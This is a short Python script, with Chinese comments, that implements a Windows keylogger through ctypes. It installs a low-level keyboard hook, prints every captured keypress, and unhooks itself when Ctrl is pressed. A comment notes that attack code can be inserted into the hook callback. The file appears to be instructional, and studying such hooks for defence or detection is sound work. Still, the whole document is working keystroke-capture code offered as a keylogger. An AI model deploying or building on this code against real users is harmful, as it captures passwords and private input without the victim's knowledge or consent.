import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

user32 = windll.user32
kernel32 = windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162

class KeyLogger:# 定义拥有挂钩与拆钩功能的类
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None

    def installHokProc(self, pointer):# 挂钩
        self.hooked = self.lUser32.SetWindowsHookExA(# 设置钩子
            WH_KEYBOARD_LL,# 设置要监视的事件
            pointer,
            kernel32.GetModuleHandleW(None),
            0
        )
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):# 拆钩
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)# 拆除之前设置的钩子
        self.hooked = None

def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)

def hookProc(nCode, wParam, lParam):# 在该函数中可以插入多种黑客攻击代码
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
    # hookedKey = chr(0xFFFFFFFF&lParam[0])# 若到来的消息类型是WM_KEYDOWN
    hookedKey = lParam[0]
    #print(hookedKey)# 将消息输出到屏幕
    #print(0xFFFFFFFF&lParam[0])
    print(chr(0xFFFFFFFF&lParam[0]))#根据ASCII码表进行转换
    if CTRL_CODE == int(lParam[0]):# 若消息值用<Ctrl>键的值一致,则拆除钩子
        print("Ctrl pressed, call uninstallHook()")
        keyLogger.uninstallHookProc()
        sys.exit(-1)
    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)# 将控制权让给钩链中的其他钩子

def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg), 0, 0, 0)# 监视队列,消息进入队列后取出消息,并传递给钩链中第一个钩子

keyLogger = KeyLogger() #start of hook process
pointer = getFPTR(hookProc)

if keyLogger.installHokProc(pointer):
    print("installed keyLogger")

startKeyLog()